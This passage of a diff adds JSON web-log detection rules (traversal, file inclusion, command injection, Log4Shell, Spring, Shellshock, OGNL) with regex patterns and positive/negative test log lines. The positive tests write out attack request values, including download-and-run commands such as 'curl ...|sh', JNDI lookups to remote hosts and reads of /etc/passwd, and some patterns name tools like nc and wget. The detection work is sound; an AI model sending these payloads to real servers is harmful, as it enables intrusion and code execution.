+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/wiki/etc...passwd",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/wiki/etc...passwd"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-lfi-semicolon-dotdot",
+      "name": "Path traversal: ..;/ sequence",
+      "description": "The ..;/ sequence is a servlet-container and reverse-proxy path normalisation bypass used against management interfaces.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\.\\.;/"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "traversal"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=55 dec=0 target=/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app/..;/admin/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/app/..;/admin/"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a/b;jsessionid=1",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/a/b;jsessionid=1"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/dots..;text",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/docs/dots..;text"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-lfi-sensitive-file",
+      "name": "Local file inclusion: sensitive system file named in request",
+      "description": "A well-known system file (/etc/passwd, /proc/self/environ, win.ini, ...) appears in the decoded request, typically as the target of a traversal or inclusion bug.",
+      "tactic": "Credential Access",
+      "technique": "T1552.001",
+      "technique_name": "Unsecured Credentials: Credentials In Files",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:/etc/(?:passwd|shadow|group|sudoers)\\b|/proc/(?:self|\\d{1,6})/(?:environ|cmdline|maps)\\b|\\bwin\\.ini(?:\\s|$|&)|\\bboot\\.ini(?:\\s|$|&)|[/\\\\]windows[/\\\\]system32[/\\\\]|/var/log/(?:auth|secure)\\.log|/root/\\.ssh/)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "lfi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/view",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/view?page=/etc/passwd"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/f",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/f?name=/proc/self/environ"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/f",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/f?name=c:\\windows\\win.ini"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/guide/etc/passwords",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/guide/etc/passwords"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/win.ini-explained.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/docs/win.ini-explained.html"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/proc/selfie",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/proc/selfie"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-lfi-php-wrapper",
+      "name": "Local file inclusion: PHP or URI stream wrapper",
+      "description": "php://filter, php://input, expect://, phar://, zip:// or data:// in a parameter value abuses PHP stream wrappers to read source or execute code.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:php://(?:filter|input|fd|memory)|\\bexpect://|\\bphar://|\\bzip://|\\bglob://|\\bdata://text|\\bfile:///)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "lfi",
+        "php"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=69 dec=0 target=/index.php?page=php://filter/convert.base64-encode/resource=index.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/a.php?f=expect://id"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=22 dec=0 target=/a?f=file:///etc/hosts"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/redirect",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=35 dec=0 target=/redirect?u=https://example.org/php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/php-streams",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/docs/php-streams"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/zip/download",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=13 dec=0 target=/zip/download"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-rfi-remote-include",
+      "name": "Remote file inclusion: URL in an include-style parameter",
+      "description": "A parameter that usually names a local file or template (file, page, include, template, ...) was given an http(s) or ftp URL.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "[?&](?:file|page|path|include|inc|template|doc|view|module|lang|dir|document|load|folder|conf)=(?:https?|ftp)://"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "rfi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=45 dec=0 target=/index.php?page=http://evil.example/shell.txt"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=41 dec=0 target=/a.php?include=https://198.51.100.9/x.php"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/index.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/index.php?page=2"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/r",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/r?url=https://example.org/x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/a.php?page=about"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-cmdi-shell-metachar",
+      "name": "Command injection: shell separator followed by a command",
+      "description": "A shell separator (; | && backtick $() ) immediately followed by a common command such as id, cat, wget or bash inside a request value.",
+      "tactic": "Execution",
+      "technique": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:;|\\||&&|`|\\$\\()\\s*(?:cat|ls|id|whoami|uname|wget|curl|nc|ncat|bash|sh|python[23]?|perl|ping|nslookup|powershell)(?:\\s|$|[;|&)`<>])"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "cmdi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/ping",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/ping?host=127.0.0.1;id"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/ping",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=36 dec=0 target=/ping?host=127.0.0.1|cat /etc/passwd"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/x?a=$(whoami)"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/x?a=`uname -a`"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/search",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/search?q=a;id=5"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/ls/files",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=9 dec=0 target=/ls/files"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=14 dec=0 target=/a?q=this|that"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/q",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/q?x=1&&y=2"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-cmdi-shell-path",
+      "name": "Command injection: shell interpreter path or switch in request",
+      "description": "/bin/sh, /bin/bash, cmd /c or PowerShell encoded-command switches inside a request value.",
+      "tactic": "Execution",
+      "technique": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:/bin/(?:ba|da|z)?sh\\b|/bin/busybox\\b|\\bcmd(?:\\.exe)?\\s+/c\\s|\\bpowershell(?:\\.exe)?\\s+-(?:e|enc|c|nop|w)\\b)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "cmdi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/cgi-bin/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/cgi-bin/x?c=/bin/sh -c id"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=19 dec=0 target=/a?c=cmd.exe /c dir"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/a?c=powershell -enc SQBFAFgA"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/powershell-tips",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=21 dec=0 target=/docs/powershell-tips"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/bin/shell-guide",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/bin/shell-guide"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=20 dec=0 target=/a?q=cmd and control"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-cmdi-download-exec",
+      "name": "Command injection: remote download command in request",
+      "description": "wget or curl followed by a URL, or certutil -urlcache, inside a request value is an attempt to fetch and run a payload.",
+      "tactic": "Execution",
+      "technique": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:\\b(?:wget|curl)\\s+(?:-\\w+\\s+)*(?:https?|ftp)://|\\bcertutil\\s+-urlcache|\\btftp\\s+-i\\s)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "cmdi"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=44 dec=0 target=/a?c=wget http://198.51.100.9/x.sh -O /tmp/x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=38 dec=0 target=/a?c=;curl -s http://198.51.100.9/a|sh"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=43 dec=0 target=/a?c=certutil -urlcache -f http://x/a a.exe"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/wget-manual",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/docs/wget-manual"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/a?q=curl vs wget"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/dl/curl-8.5.tar.gz",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=19 dec=0 target=/dl/curl-8.5.tar.gz"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-log4shell",
+      "name": "Log4Shell JNDI lookup in request (CVE-2021-44228 family)",
+      "description": "A ${jndi:...} lookup, or an obfuscated form built from nested lookups, appears in the request or User-Agent.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "critical",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "any": [
+          {
+            "all": [
+              {
+                "field": "executable",
+                "op": "equals",
+                "pattern": "web:access"
+              },
+              {
+                "field": "command",
+                "op": "contains",
+                "patterns": [
+                  "${jndi",
+                  "jndi:ldap",
+                  "jndi:rmi",
+                  "jndi:dns",
+                  "jndi:ldaps",
+                  "jndi:iiop",
+                  "${${::-",
+                  "${${lower:",
+                  "${${upper:",
+                  "${${env:",
+                  "${${date:"
+                ]
+              }
+            ]
+          },
+          {
+            "all": [
+              {
+                "field": "executable",
+                "op": "equals",
+                "pattern": "web:access"
+              },
+              {
+                "field": "parent_exe",
+                "op": "contains",
+                "patterns": [
+                  "${jndi",
+                  "jndi:ldap",
+                  "jndi:rmi",
+                  "${${::-",
+                  "${${lower:",
+                  "${${upper:"
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "log4j",
+        "java"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=33 dec=0 target=/?x=${jndi:ldap://198.51.100.9/a}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "${jndi:ldap://198.51.100.9/a}",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=31 dec=0 target=/?x=${${lower:j}ndi:ldap://x/a}"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/jndi-intro",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/docs/jndi-intro"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/?x=${price}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "curl/8.5.0",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-spring-classloader",
+      "name": "Spring class loader or routing-expression abuse (CVE-2022-22965, CVE-2022-22963 family)",
+      "description": "Request parameters that traverse class.module.classLoader, or a spring.cloud.function.routing-expression header value, are used to reach code execution in Spring applications.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "critical",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "contains",
+            "patterns": [
+              "class.module.classloader",
+              "class.classloader",
+              "spring.cloud.function.routing-expression"
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "spring",
+        "java"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=79 dec=0 target=/app?class.module.classLoader.resources.context.parent.pipeline.first.pattern=x"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/functionRouter",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=77 dec=0 target=/functionRouter?spring.cloud.function.routing-expression=T(java.lang.Runtime)"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/spring-class-loading",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/docs/spring-class-loading"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/app",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/app?class=module"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-shellshock",
+      "name": "Shellshock function definition in request (CVE-2014-6271 family)",
+      "description": "The () { :; }; function-definition prefix in the request or User-Agent is the Bash environment-variable code execution payload.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "critical",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "any": [
+          {
+            "all": [
+              {
+                "field": "executable",
+                "op": "equals",
+                "pattern": "web:access"
+              },
+              {
+                "field": "command",
+                "op": "regex",
+                "pattern": "\\(\\)\\s*\\{\\s*:\\s*;\\s*\\}\\s*;"
+              }
+            ]
+          },
+          {
+            "all": [
+              {
+                "field": "executable",
+                "op": "equals",
+                "pattern": "web:access"
+              },
+              {
+                "field": "parent_exe",
+                "op": "regex",
+                "pattern": "\\(\\)\\s*\\{\\s*:\\s*;\\s*\\}\\s*;"
+              }
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "shellshock"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "() { :;}; /bin/bash -c 'id'",
+            "path": "/cgi-bin/test.cgi",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/cgi-bin/test.cgi"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/cgi-bin/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=28 dec=0 target=/cgi-bin/x?a=() { :; }; echo"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/cgi-bin/test.cgi",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=17 dec=0 target=/cgi-bin/test.cgi"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/a?q=() {}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (compatible)",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-exploit-ognl-expression",
+      "name": "OGNL or expression-language injection (Struts family)",
+      "description": "OGNL context access (#_memberAccess, ognl.OgnlContext) or ${(#...)} / %{(#...)} expressions are used in Struts and Confluence-style remote code execution.",
+      "tactic": "Initial Access",
+      "technique": "T1190",
+      "technique_name": "Exploit Public-Facing Application",
+      "severity": "critical",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "contains",
+            "patterns": [
+              "#_memberaccess",
+              "ognlcontext",
+              "%{(#",
+              "${(#",
+              "@java.lang.runtime",
+              "java.lang.processbuilder",
+              "#context["
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "struts",
+        "ognl"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.action",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=69 dec=0 target=/a.action?redirect:${(#a=@java.lang.Runtime@getRuntime()).exec('id')}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=26 dec=0 target=/x?q=%{(#_memberAccess=1)}"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
